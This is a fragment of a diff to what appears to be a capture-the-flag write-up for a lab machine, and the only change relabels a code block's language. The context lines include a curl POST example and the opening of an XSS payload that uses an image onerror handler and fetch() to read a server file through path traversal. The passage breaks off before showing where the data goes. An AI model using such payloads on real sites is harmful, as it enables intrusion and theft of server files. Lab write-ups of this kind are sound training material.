@@ -45,7 +45,7 @@ curl -k -X POST -d "data=test" https://domain.com/
 
 Send via xss:
 
-```console
+```html
 <img src=x onerror="fetch('/messages.php?file=../../../../../../../../var/www/statistics.alert.htb/index.php')
 .then(response => response.text())
 .then(data => {
